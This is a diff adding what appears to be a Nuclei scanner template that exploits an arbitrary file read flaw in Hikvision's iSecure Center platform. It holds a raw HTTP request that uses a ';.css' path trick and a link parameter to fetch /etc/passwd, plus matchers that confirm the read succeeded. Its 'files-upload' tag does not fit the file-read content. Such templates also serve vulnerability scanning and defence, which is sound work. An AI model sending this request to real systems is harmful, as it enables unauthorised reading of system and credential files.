@@ -1,0 +1,24 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - root:x
+            - /bin/bash
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /lm/api/files;.css?link=/etc/passwd HTTP/1.1
+          Host: {{Hostname}}
+id: hikvision-File-reading
+info:
+    author: Superhero
+    description: 综合安防管理平台 iSecure Center /lm/api/files存在任意文件读取漏洞
+    name: 综合安防管理平台 iSecure Center /lm/api/files 任意文件读取
+    severity: high
+    tags:
+        - files-upload
